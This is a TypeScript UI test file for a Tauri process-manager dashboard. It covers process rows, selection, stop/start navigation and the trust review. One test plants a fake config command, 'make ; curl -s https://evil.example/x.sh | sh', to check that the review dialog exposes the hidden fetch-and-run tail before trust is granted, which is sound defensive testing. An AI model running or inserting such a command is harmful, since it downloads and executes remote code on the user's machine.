// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { clearMocks, mockIPC } from "@tauri-apps/api/mocks";
import { emit } from "@tauri-apps/api/event";
import { DEFAULT_APPEARANCE } from "@/lib/appearance";
import { DEFAULT_SIDEBAR } from "@/lib/sidebar";
import type { ProcessView } from "@/domain";

// The terminal hook drives the real xterm.js emulator against a measured DOM surface,
// which jsdom cannot provide; the real PTY/echo path is covered by the WebDriver e2e and
// by manual verification. Stubbing it lets the dashboard mount so this test can exercise
// the IPC -> read-model -> render/selection path that is the integration's real risk.
vi.mock("@/components/terminal/useTerminal", () => ({
  useTerminal: () => ({ hostRef: { current: null }, state: "not-started" as const }),
}));

// The persisted read-model cache is the disk boundary (tauri-plugin-store); stub it so the
// dashboard revalidates against the mocked backend from a cold cache, deterministically.
vi.mock("@/store/cache/persistentCache", () => ({
  CacheKey: { projects: "projects", appInfo: "app-info", agents: "agents" },
  readSnapshot: vi.fn(() => Promise.resolve(null)),
  writeSnapshot: vi.fn(() => Promise.resolve()),
}));

import App from "@/App";

const STACK: ProcessView[] = [
  {
    id: 1,
    project: 1,
    kind: "Agent",
    label: "assistant",
    status: "Stopped",
    exit_code: null,
    requires_trust: false,
    resumable: false,
    ports: [],
    ready: "Ungated",
  },
  {
    id: 2,
    project: 1,
    kind: "Terminal",
    label: "shell",
    status: "Running",
    exit_code: null,
    requires_trust: false,
    resumable: false,
    ports: [],
    ready: "Ungated",
  },
  {
    id: 3,
    project: 1,
    kind: "Command",
    label: "build",
    status: "Stopped",
    exit_code: null,
    requires_trust: true,
    resumable: false,
    ports: [],
    ready: "Ungated",
  },
  {
    id: 4,
    project: 1,
    kind: "Command",
    label: "web",
    status: "Running",
    exit_code: null,
    requires_trust: false,
    resumable: false,
    ports: [],
    ready: "Ungated",
  },
];

// The loaded project the fixture stack belongs to. Named distinctly from the app so a
// header assertion can tell the project title apart from the toolbar's app name.
const PROJECT = { id: 1, name: "storefront", root: "/p", icon: null };

// Stand in for the Tauri backend: answer the snapshot/identity/project commands with a
// fixture and let every other command (the event listener, the pty channel) resolve to
// undefined.
function mockBackend(
  processes: ProcessView[],
  projects = [PROJECT],
  observe: (cmd: string, args: unknown) => void = () => {},
  shouldMockEvents = false,
) {
  mockIPC(
    (cmd, args) => {
      observe(cmd, args);
      if (cmd === "app_info") return { name: "soloist", version: "0.1.0" };
      if (cmd === "proc_list") return processes;
      if (cmd === "project_list") return projects;
      if (cmd === "appearance") return DEFAULT_APPEARANCE;
      if (cmd === "sidebar_settings") return DEFAULT_SIDEBAR;
      if (cmd === "hotkeys") return [];
      // The fixture project is a plain directory, so version control has nothing to report.
      if (cmd === "git_status" || cmd === "git_files") return null;
      return undefined;
    },
    { shouldMockEvents },
  );
}

function row(id: number): HTMLElement {
  const element = document.querySelector<HTMLElement>(`[data-process-id="${id}"]`);
  if (!element) throw new Error(`no row for process ${id}`);
  return element;
}

afterEach(() => {
  cleanup();
  clearMocks();
});

// A deferred surface is fetched, transformed, and evaluated on first use, which under a fully
// loaded suite takes longer than the default wait allows. It bounds a wait, not an assertion.
const LAZY_CHUNK_TIMEOUT = 15_000;

describe("App dashboard", () => {
  it("renders the stack grouped by subtype with a status per row", async () => {
    mockBackend(STACK);
    render(<App />);

    const rows = await screen.findAllByRole("treeitem");
    expect(rows).toHaveLength(4);

    // The project node titles the tree; its subtype subgroups nest beneath it.
    expect(screen.getByText("storefront")).toBeTruthy();

    // The three subtype groups are present as sentence-case headers.
    expect(screen.getByText("Agents")).toBeTruthy();
    expect(screen.getByText("Terminals")).toBeTruthy();
    expect(screen.getByText("Commands")).toBeTruthy();

    // Status is read from the value, not scraped text.
    expect(within(row(1)).getByText("assistant")).toBeTruthy();
    expect(row(1).querySelector("[data-status]")?.getAttribute("data-status")).toBe("Stopped");
    expect(row(2).querySelector("[data-status]")?.getAttribute("data-status")).toBe("Running");
  });

  it("puts the version control rail beside the main area, never around it", async () => {
    mockBackend(STACK);
    render(<App />);
    await screen.findAllByRole("treeitem");
    fireEvent.click(within(row(2)).getByText("shell"));

    const main = document.querySelector("main");
    const rail = await screen.findByRole(
      "complementary",
      { name: "Version control" },
      { timeout: LAZY_CHUNK_TIMEOUT },
    );

    // The rail's chunk arrives after the first paint. Were it an ancestor of <main>, the terminal
    // pane would be torn down and rebuilt the moment it landed, losing the emulator and its
    // scrollback — so the two must be siblings, and the pane's width must stay the main area's
    // to resize against.
    expect(main).toBeTruthy();
    expect(main?.contains(rail)).toBe(false);
    expect(rail.contains(main)).toBe(false);
    expect(main?.parentElement?.contains(rail)).toBe(true);
  });

  it("opens the diff without ever tearing down the terminal beside it", async () => {
    // A repository with one change, so the rail has a row to open, and a diff with no patch in
    // it, so the split renders its own surface without the viewer's cost.
    mockIPC(
      (cmd) => {
        if (cmd === "app_info") return { name: "soloist", version: "0.1.0" };
        if (cmd === "proc_list") return STACK;
        if (cmd === "project_list") return [PROJECT];
        if (cmd === "appearance") return DEFAULT_APPEARANCE;
        if (cmd === "sidebar_settings") return DEFAULT_SIDEBAR;
        if (cmd === "hotkeys") return [];
        if (cmd === "git_status")
          return {
            branch: { name: "main", upstream: null, sync: { state: "unknown" } },
            changes: [
              {
                path: "src/main.rs",
                status: { staged: null, unstaged: "modified" },
                original_path: null,
              },
            ],
          };
        if (cmd === "git_files") return null;
        if (cmd === "git_diff")
          return {
            path: "src/main.rs",
            original_path: null,
            target: "unstaged",
            binary: false,
            patch: "",
            truncated: false,
          };
        return undefined;
      },
      { shouldMockEvents: true },
    );
    render(<App />);
    await screen.findAllByRole("treeitem");
    fireEvent.click(within(row(2)).getByText("shell"));
    const main = document.querySelector("main");
    if (!main) throw new Error("no main area");
    const terminal = (await within(main).findByTestId("terminal-host")).closest("section");
    if (!terminal) throw new Error("no terminal pane");

    const changes = await screen.findByRole("tree", { name: "Changed files" });
    fireEvent.click(within(changes).getByText("main.rs"));

    const diff = await screen.findByRole(
      "region",
      { name: "Diff" },
      { timeout: LAZY_CHUNK_TIMEOUT },
    );
    // The split is a sibling of the panes' region inside <main>, so opening it adds a box rather
    // than replacing one — the very same terminal element is still mounted, emulator and
    // scrollback intact.
    expect(diff).toBeTruthy();
    expect(document.body.contains(terminal)).toBe(true);
    expect(terminal.contains(diff)).toBe(false);
    expect(diff.contains(terminal)).toBe(false);
  });

  it("derives sparse control availability from the status FSM", async () => {
    mockBackend(STACK);
    render(<App />);
    await screen.findAllByRole("treeitem");

    // A stopped process offers Start, not Stop; a running terminal offers Stop, not Start.
    const stopped = within(row(1));
    expect(stopped.getByLabelText("Start")).toBeTruthy();
    expect(stopped.queryByLabelText("Stop")).toBeNull();

    const running = within(row(2));
    expect(running.queryByLabelText("Start")).toBeNull();
    expect(running.getByLabelText("Stop")).toBeTruthy();
  });

  it("selects a process and opens its terminal pane", async () => {
    mockBackend(STACK);
    render(<App />);
    await screen.findAllByRole("treeitem");

    // With a populated stack but nothing selected, the pane remains the canonical start surface.
    expect(screen.getByRole("heading", { name: "Start in Soloist" })).toBeTruthy();
    expect(row(1).getAttribute("aria-selected")).toBe("false");

    fireEvent.click(row(1));

    expect(row(1).getAttribute("aria-selected")).toBe("true");
    // The terminal pane mounts lazily: once its code-split chunk loads, the label appears in
    // both the row and the pane header.
    await waitFor(() => expect(screen.getAllByText("assistant")).toHaveLength(2));
    expect(screen.queryByRole("heading", { name: "Start in Soloist" })).toBeNull();

    fireEvent.click(screen.getByRole("button", { name: "Start page" }));
    expect(screen.getByRole("heading", { name: "Start in Soloist" })).toBeTruthy();
    expect(row(1).getAttribute("aria-selected")).toBe("false");
  });

  it("returns to the previously selected process when stopping the current terminal", async () => {
    const stopped: number[] = [];
    mockBackend(STACK, [PROJECT], (cmd, args) => {
      if (cmd === "proc_stop") stopped.push((args as { id: number }).id);
    });
    render(<App />);
    await screen.findAllByRole("treeitem");

    fireEvent.click(row(1));
    fireEvent.click(row(2));
    expect(row(2).getAttribute("aria-selected")).toBe("true");

    fireEvent.click(within(row(2)).getByLabelText("Stop"));
    expect(row(1).getAttribute("aria-selected")).toBe("true");
    expect(stopped).toEqual([2]);
  });

  it("returns to an explicitly stopped terminal when the user starts it again", async () => {
    const started: number[] = [];
    mockBackend(
      STACK,
      [PROJECT],
      (cmd, args) => {
        if (cmd === "proc_start") started.push((args as { id: number }).id);
      },
      true,
    );
    render(<App />);
    await screen.findAllByRole("treeitem");
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(row(1));
    fireEvent.click(row(2));
    fireEvent.click(within(row(2)).getByLabelText("Stop"));
    expect(row(1).getAttribute("aria-selected")).toBe("true");

    await act(async () => {
      await emit("domain-event", {
        type: "ProcessStatusChanged",
        id: 2,
        from: "Running",
        to: "Stopped",
        exit_code: 0,
      });
    });
    fireEvent.click(within(row(2)).getByLabelText("Start"));

    expect(started).toEqual([2]);
    expect(row(2).getAttribute("aria-selected")).toBe("true");
  });

  it("returns to the target when restarting it after Stop navigated away", async () => {
    const restarted: number[] = [];
    mockBackend(
      STACK,
      [PROJECT],
      (cmd, args) => {
        if (cmd === "proc_restart") restarted.push((args as { id: number }).id);
      },
      true,
    );
    render(<App />);
    await screen.findAllByRole("treeitem");
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(row(1));
    fireEvent.click(row(2));
    fireEvent.click(within(row(2)).getByLabelText("Stop"));
    await act(async () => {
      await emit("domain-event", {
        type: "ProcessStatusChanged",
        id: 2,
        from: "Running",
        to: "Crashed",
        exit_code: 1,
      });
    });
    fireEvent.click(within(row(2)).getByLabelText("Restart"));

    expect(restarted).toEqual([2]);
    expect(row(2).getAttribute("aria-selected")).toBe("true");
  });

  it("returns to the target when resuming it after Stop navigated away", async () => {
    const target: ProcessView = {
      ...STACK[0],
      id: 5,
      label: "resumable agent",
      status: "Running",
      resumable: true,
    };
    const resumed: number[] = [];
    mockBackend(
      [...STACK, target],
      [PROJECT],
      (cmd, args) => {
        if (cmd === "agent_resume") resumed.push((args as { id: number }).id);
      },
      true,
    );
    render(<App />);
    await screen.findAllByRole("treeitem");
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(row(1));
    fireEvent.click(row(5));
    fireEvent.click(within(row(5)).getByLabelText("Stop"));
    await act(async () => {
      await emit("domain-event", {
        type: "ProcessStatusChanged",
        id: 5,
        from: "Running",
        to: "Stopped",
        exit_code: 0,
      });
    });
    fireEvent.click(within(row(5)).getByLabelText("Resume last session"));

    expect(resumed).toEqual([5]);
    expect(row(5).getAttribute("aria-selected")).toBe("true");
  });

  it("returns to Start when the stopped process has no activation predecessor", async () => {
    mockBackend(STACK);
    render(<App />);
    await screen.findAllByRole("treeitem");

    fireEvent.click(row(2));
    fireEvent.click(within(row(2)).getByLabelText("Stop"));
    expect(screen.getByRole("heading", { name: "Start in Soloist" })).toBeTruthy();
  });

  it("does not revisit a non-selected process that the user already stopped", async () => {
    const secondTerminal: ProcessView = { ...STACK[1], id: 5, label: "shell 2" };
    mockBackend([...STACK, secondTerminal]);
    render(<App />);
    await screen.findAllByRole("treeitem");

    fireEvent.click(row(2));
    fireEvent.click(row(5));
    fireEvent.click(within(row(2)).getByLabelText("Stop"));
    expect(row(5).getAttribute("aria-selected")).toBe("true");

    fireEvent.click(within(row(5)).getByLabelText("Stop"));
    expect(screen.getByRole("heading", { name: "Start in Soloist" })).toBeTruthy();
  });

  it("keeps a naturally exited command selected but falls back when it is removed externally", async () => {
    mockBackend(STACK, [PROJECT], () => {}, true);
    render(<App />);
    await screen.findAllByRole("treeitem");
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(row(1));
    fireEvent.click(row(4));
    await act(async () => {
      await emit("domain-event", {
        type: "ProcessStatusChanged",
        id: 4,
        from: "Running",
        to: "Stopped",
        exit_code: 0,
      });
    });
    expect(row(4).getAttribute("aria-selected")).toBe("true");

    await act(async () => {
      await emit("domain-event", { type: "ProcessRemoved", id: 4 });
    });
    expect(row(1).getAttribute("aria-selected")).toBe("true");
  });

  it("navigates only after live removal is confirmed, not when it opens or is dismissed", async () => {
    const closed: number[] = [];
    mockBackend(STACK, [PROJECT], (cmd, args) => {
      if (cmd === "proc_close") closed.push((args as { id: number }).id);
    });
    render(<App />);
    await screen.findAllByRole("treeitem");

    fireEvent.click(row(1));
    fireEvent.click(row(2));
    fireEvent.pointerDown(within(row(2)).getByLabelText("More actions for shell"), {
      button: 0,
      ctrlKey: false,
    });
    fireEvent.click(await screen.findByRole("menuitem", { name: "Remove" }));
    expect(await screen.findByRole("heading", { name: "Remove “shell”?" })).toBeTruthy();
    expect(row(2).getAttribute("aria-selected")).toBe("true");
    expect(closed).toEqual([]);

    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
    expect(row(2).getAttribute("aria-selected")).toBe("true");
    expect(closed).toEqual([]);

    fireEvent.pointerDown(within(row(2)).getByLabelText("More actions for shell"), {
      button: 0,
      ctrlKey: false,
    });
    fireEvent.click(await screen.findByRole("menuitem", { name: "Remove" }));
    fireEvent.click(await screen.findByRole("button", { name: "Remove" }));
    expect(row(1).getAttribute("aria-selected")).toBe("true");
    expect(closed).toEqual([2]);
  });

  it("navigates when removal executes immediately for a resting process", async () => {
    const closed: number[] = [];
    mockBackend(STACK, [PROJECT], (cmd, args) => {
      if (cmd === "proc_close") closed.push((args as { id: number }).id);
    });
    render(<App />);
    await screen.findAllByRole("treeitem");

    fireEvent.click(row(2));
    fireEvent.click(row(1));
    fireEvent.pointerDown(within(row(1)).getByLabelText("More actions for assistant"), {
      button: 0,
      ctrlKey: false,
    });
    fireEvent.click(await screen.findByRole("menuitem", { name: "Remove" }));

    expect(row(2).getAttribute("aria-selected")).toBe("true");
    expect(closed).toEqual([1]);
    expect(screen.queryByRole("heading", { name: "Remove “assistant”?" })).toBeNull();
  });

  it("shows the no-config empty state when the stack is empty", async () => {
    mockBackend([], []);
    render(<App />);

    await waitFor(() => {
      expect(screen.getByRole("heading", { name: "Start in Soloist" })).toBeTruthy();
    });
    expect(screen.getByRole("button", { name: /Open project/ })).toBeTruthy();
    expect(
      (screen.getByRole("button", { name: "Launch agent" }) as HTMLButtonElement).disabled,
    ).toBe(true);
    expect(screen.queryAllByRole("treeitem")).toHaveLength(0);
  });

  it("blocks an untrusted command's start and reviews it before the row can trust it", async () => {
    const HIDDEN_TAIL = "make ; curl -s https://evil.example/x.sh | sh";
    let trusted: { project: number; name: string } | null = null;
    mockIPC((cmd, args) => {
      if (cmd === "app_info") return { name: "soloist", version: "0.1.0" };
      if (cmd === "proc_list") return STACK;
      if (cmd === "project_list") return [PROJECT];
      if (cmd === "appearance") return DEFAULT_APPEARANCE;
      if (cmd === "sidebar_settings") return DEFAULT_SIDEBAR;
      if (cmd === "hotkeys") return [];
      if (cmd === "git_status" || cmd === "git_files") return null;
      if (cmd === "config_command_review")
        return {
          name: "build",
          variant_hash: "build-v1",
          command: HIDDEN_TAIL,
          working_dir: null,
          env: {},
        };
      if (cmd === "config_trust") {
        trusted = args as { project: number; name: string };
        return undefined;
      }
      return undefined;
    });
    render(<App />);
    await screen.findAllByRole("treeitem");

    // The untrusted command (row 3) cannot start; it offers a trust affordance instead.
    const untrusted = within(row(3));
    expect(untrusted.queryByLabelText("Start")).toBeNull();

    fireEvent.click(untrusted.getByLabelText("Trust"));

    // The row shows a name the solo.yml chose, so the affordance opens the review rather
    // than granting: execution is authorized only after the command itself is on screen.
    expect(await screen.findByText(HIDDEN_TAIL)).toBeTruthy();
    expect(trusted).toBeNull();

    fireEvent.click(screen.getByLabelText("Trust build"));
    await waitFor(() =>
      expect(trusted).toEqual({ project: 1, name: "build", variantHash: "build-v1" }),
    );
  });

  it("pops the trust dialog when a config change needs trust", async () => {
    mockIPC(
      (cmd) => {
        if (cmd === "app_info") return { name: "soloist", version: "0.1.0" };
        if (cmd === "proc_list") return STACK;
        if (cmd === "project_list") return [PROJECT];
        if (cmd === "appearance") return DEFAULT_APPEARANCE;
        if (cmd === "sidebar_settings") return DEFAULT_SIDEBAR;
        if (cmd === "hotkeys") return [];
        if (cmd === "git_status" || cmd === "git_files") return null;
        return undefined;
      },
      { shouldMockEvents: true },
    );
    render(<App />);
    await screen.findAllByRole("treeitem");
    // Let the trust listener register before emitting — events have no replay.
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    await act(async () => {
      await emit("domain-event", {
        type: "ConfigChanged",
        project: 1,
        requires_trust: true,
        diff: { added: ["Api"], updated: [], removed: [], renamed: [] },
        commands: [{ name: "Api", command: "cargo run", working_dir: null, env: {} }],
      });
    });

    expect(screen.getByText("Trust changed commands")).toBeTruthy();
    expect(screen.getByText("cargo run")).toBeTruthy();
  });

  it("opens the process an in-app alert came from when its toast is clicked", async () => {
    mockBackend(STACK, [PROJECT], () => {}, true);
    render(<App />);
    await screen.findAllByRole("treeitem");
    // Let the alert listener register before emitting — events have no replay.
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(row(1));
    expect(row(4).getAttribute("aria-selected")).toBe("false");

    await act(async () => {
      await emit("domain-event", {
        type: "NotificationRaised",
        process: 4,
        kind: "crashed",
        title: "web crashed",
        body: "The process exited unexpectedly.",
        sound: null,
      });
      await new Promise((resolve) => setTimeout(resolve, 0));
    });

    fireEvent.click(screen.getByText("web crashed"));

    expect(row(4).getAttribute("aria-selected")).toBe("true");
    expect(row(1).getAttribute("aria-selected")).toBe("false");
  });
});
